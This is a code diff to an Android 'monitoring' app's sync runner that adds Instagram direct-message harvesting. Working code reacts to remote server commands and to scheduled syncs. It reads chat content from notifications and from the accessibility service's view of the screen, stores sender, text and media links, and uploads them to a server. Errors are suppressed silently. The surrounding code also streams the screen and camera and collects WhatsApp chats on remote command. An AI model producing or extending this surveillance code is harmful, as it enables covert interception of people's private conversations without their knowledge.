@@ -31,6 +31,9 @@ import com.spapp.monitoring.network.SmsLogEntryDto
 import com.spapp.monitoring.network.SmsLogSyncRequest
 import com.spapp.monitoring.network.WebHistoryEntryDto
 import com.spapp.monitoring.network.WebHistorySyncRequest
+import com.spapp.monitoring.data.local.InstagramMessageEntry
+import com.spapp.monitoring.network.InstagramMessageEntryDto
+import com.spapp.monitoring.network.InstagramMessagesSyncRequest
 import com.spapp.monitoring.network.WhatsAppMessageEntryDto
 import com.spapp.monitoring.network.WhatsAppMessagesSyncRequest
 import java.time.Instant
@@ -66,6 +69,7 @@ class SyncRunner(private val context: Context) {
         commands.filter { it.command_type == "screen_stream" }.forEach { processScreenStreamCommand(bearer, it) }
         commands.filter { it.command_type == "camera_stream" }.forEach { processCameraStreamCommand(bearer, it) }
         commands.filter { it.command_type == "get_whatsapp_chat" }.forEach { processGetWhatsAppChatCommand(bearer, it) }
+        commands.filter { it.command_type == "get_instagram_chat" }.forEach { processGetInstagramChatCommand(bearer, it) }
 
         val flagsResponse = try {
             ApiClient.service.getFeatureFlags(bearer)
@@ -92,6 +96,16 @@ class SyncRunner(private val context: Context) {
                 }
                 com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantWhatsAppUpload(context)
                 ApiClient.service.ackCommand(bearer, command.id, AckCommandRequest(success = true, message = "WhatsApp sync triggered"))
+            } catch (_: Exception) {}
+        }
+        commands.filter { it.command_type == "sync_instagram" }.forEach { command ->
+            try {
+                com.spapp.monitoring.collectors.WhatsAppNotificationListener.instance?.processAllActiveNotifications()
+                com.spapp.monitoring.blocking.BlockAccessibilityService.instance?.let { service ->
+                    service.recordInstagramChatIfForeground(service.rootInActiveWindow)
+                }
+                syncInstagramMessages(bearer, AppDatabase.getInstance(context))
+                ApiClient.service.ackCommand(bearer, command.id, AckCommandRequest(success = true, message = "Instagram sync triggered"))
             } catch (_: Exception) {}
         }
         com.spapp.monitoring.collectors.WhatsAppNotificationListener.instance?.processAllActiveNotifications()
@@ -162,6 +176,7 @@ class SyncRunner(private val context: Context) {
         commands.filter { it.command_type == "camera_stream" }.forEach { processCameraStreamCommand(bearer, it) }
         commands.filter { it.command_type == "whatsapp_sync_now" }.forEach { processWhatsAppSyncCommand(bearer, it) }
         commands.filter { it.command_type == "get_whatsapp_chat" }.forEach { processGetWhatsAppChatCommand(bearer, it) }
+        commands.filter { it.command_type == "get_instagram_chat" }.forEach { processGetInstagramChatCommand(bearer, it) }
 
         // 2. Heavy periodic background collectors run after commands complete
         if (flags.app_usage_tracking) {
@@ -184,6 +199,7 @@ class SyncRunner(private val context: Context) {
         }
         syncBlockRules(bearer)
         syncWhatsAppMessages(bearer, db)
+        syncInstagramMessages(bearer, db)
 
         state.lastSyncAtEpochMs = System.currentTimeMillis()
         return true
@@ -406,6 +422,103 @@ class SyncRunner(private val context: Context) {
                     AckCommandRequest(
                         success = false,
                         message = e.message ?: "Failed to get chat contents"
+                    )
+                )
+            } catch (_: Exception) {}
+        }
+    }
+
+    private suspend fun processGetInstagramChatCommand(bearer: String, command: RemoteCommand) {
+        val chatName = (command.payload?.get("chatName") as? String)?.trim()
+        val days = (command.payload?.get("days") as? Number)?.toInt() ?: 2
+        val cutoffMs = System.currentTimeMillis() - (days * 24 * 60 * 60 * 1000L)
+
+        if (chatName.isNullOrBlank()) {
+            try {
+                ApiClient.service.ackCommand(
+                    bearer,
+                    command.id,
+                    AckCommandRequest(success = false, message = "Missing chatName parameter")
+                )
+            } catch (_: Exception) {}
+            return
+        }
+
+        try {
+            val db = AppDatabase.getInstance(context)
+            val gatheredEntries = mutableListOf<InstagramMessageEntry>()
+
+            // 1. Extract messages for this chat from active notifications
+            com.spapp.monitoring.collectors.WhatsAppNotificationListener.instance?.let { listener ->
+                val notifEntries = listener.extractMessagesForInstagramChat(chatName, cutoffMs)
+                gatheredEntries.addAll(notifEntries)
+            }
+
+            // 2. If Instagram is currently foreground, inspect accessibility window
+            com.spapp.monitoring.blocking.BlockAccessibilityService.instance?.let { service ->
+                service.recordInstagramChatIfForeground(service.rootInActiveWindow)
+            }
+
+            // 3. Save any newly gathered entries into Room DB
+            if (gatheredEntries.isNotEmpty()) {
+                db.instagramMessageDao().insertAll(gatheredEntries)
+            }
+
+            // 4. Retrieve conversation messages for this chat from Room DB
+            var chatMessages = db.instagramMessageDao().getMessagesForChat(chatName, cutoffMs)
+            if (chatMessages.isEmpty()) {
+                chatMessages = db.instagramMessageDao().getMessagesForChat(chatName, cutoffMs = 0L)
+            }
+
+            // 5. Map to DTOs
+            val dtos = chatMessages.map {
+                InstagramMessageEntryDto(
+                    chatName = chatName,
+                    sender = it.sender,
+                    messageText = it.messageText,
+                    isOutgoing = it.isOutgoing,
+                    messageTime = Instant.ofEpochMilli(it.messageTimeEpochMs).toString(),
+                    mediaType = it.mediaType ?: (if (it.reelUrl != null) "reel" else if (it.mediaPath != null) "image" else null),
+                    mediaPath = it.mediaPath,
+                    reelUrl = it.reelUrl
+                )
+            }
+
+            // 6. Upload conversation messages to server
+            val resp = ApiClient.service.syncInstagramMessages(
+                bearer,
+                InstagramMessagesSyncRequest(
+                    entries = dtos,
+                    activeChat = chatName
+                )
+            )
+
+            if (resp.isSuccessful && chatMessages.isNotEmpty()) {
+                db.instagramMessageDao().markSynced(chatMessages.map { it.id })
+            }
+
+            val ackMsg = if (dtos.isNotEmpty()) {
+                "Retrieved ${dtos.size} Instagram messages for '$chatName' for the last $days days"
+            } else {
+                "No messages found for '$chatName' in the last $days days on this device"
+            }
+
+            ApiClient.service.ackCommand(
+                bearer,
+                command.id,
+                AckCommandRequest(
+                    success = dtos.isNotEmpty(),
+                    message = ackMsg
+                )
+            )
+        } catch (e: Exception) {
+            try {
+                ApiClient.service.ackCommand(
+                    bearer,
+                    command.id,
+                    AckCommandRequest(
+                        success = false,
+                        message = e.message ?: "Failed to get Instagram chat contents"
                     )
                 )
             } catch (_: Exception) {}
@@ -779,6 +892,33 @@ class SyncRunner(private val context: Context) {
             if (response.isSuccessful) {
                 db.whatsAppMessageDao().markSynced(unsynced.map { it.id })
                 db.whatsAppMessageDao().pruneOldMessages(System.currentTimeMillis() - 14 * 24 * 60 * 60 * 1000L)
+            }
+        } catch (e: Exception) {
+            // Retried on next scheduled run.
+        }
+    }
+
+    private suspend fun syncInstagramMessages(bearer: String, db: AppDatabase) {
+        val unsynced = db.instagramMessageDao().getUnsynced()
+        if (unsynced.isEmpty()) return
+
+        val dtos = unsynced.map {
+            InstagramMessageEntryDto(
+                chatName = it.chatName,
+                sender = it.sender,
+                messageText = it.messageText,
+                isOutgoing = it.isOutgoing,
+                messageTime = Instant.ofEpochMilli(it.messageTimeEpochMs).toString(),
+                mediaType = it.mediaType,
+                mediaPath = it.mediaPath,
+                reelUrl = it.reelUrl
+            )
+        }
+        try {
+            val response = ApiClient.service.syncInstagramMessages(bearer, InstagramMessagesSyncRequest(dtos))
+            if (response.isSuccessful) {
+                db.instagramMessageDao().markSynced(unsynced.map { it.id })
+                db.instagramMessageDao().pruneOldMessages(System.currentTimeMillis() - 14 * 24 * 60 * 60 * 1000L)
             }
         } catch (e: Exception) {
             // Retried on next scheduled run.
